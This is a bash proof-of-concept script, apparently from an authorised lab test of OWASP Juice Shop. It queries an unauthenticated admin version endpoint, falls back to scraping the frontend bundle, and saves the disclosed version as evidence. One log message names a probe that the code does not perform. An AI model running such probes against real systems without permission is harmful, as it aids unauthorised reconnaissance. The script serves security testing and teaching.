#!/usr/bin/env bash
# PoC: Unauthenticated version disclosure - OWASP Juice Shop
# Target: http://host.docker.internal:3000
# Endpoint: GET /rest/admin/application-version  (no auth required despite /admin/ path)
# Authorized lab engagement c01-version-leak
set -euo pipefail

TARGET="${1:-http://host.docker.internal:3000}"
OUT="/workspace/evidence/c1_version.txt"
mkdir -p "$(dirname "$OUT")"

echo "[*] Target: $TARGET"
echo "[*] Probing unauthenticated version endpoints..."

# 1. Primary: /rest/admin/application-version (missing authorization check)
RESP=$(curl -s -w '\n%{http_code}' "$TARGET/rest/admin/application-version")
CODE=$(echo "$RESP" | tail -n1)
BODY=$(echo "$RESP" | sed '$d')
echo "[+] GET /rest/admin/application-version -> HTTP $CODE: $BODY"

VERSION=$(echo "$BODY" | sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
if [ -z "$VERSION" ]; then
  echo "[-] Could not extract version from primary endpoint; falling back to /api/Feedbacks probe"
  # 2. Fallback: package.json style disclosure via frontend bundle
  VERSION=$(curl -s "$TARGET/main.js" | grep -o 'version:"[0-9][^"]*"' | head -n1 | sed 's/version:"//;s/"$//')
fi

if [ -z "$VERSION" ]; then
  echo "[-] FAILED to determine version"
  exit 1
fi

{
  echo "Application: OWASP Juice Shop"
  echo "Target:      $TARGET"
  echo "Version:     $VERSION"
  echo "Endpoint:    GET $TARGET/rest/admin/application-version (no authentication required)"
  echo "Response:    $BODY"
  echo "Discovered:  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
} | tee "$OUT"

echo
echo "[+] Evidence written to $OUT"
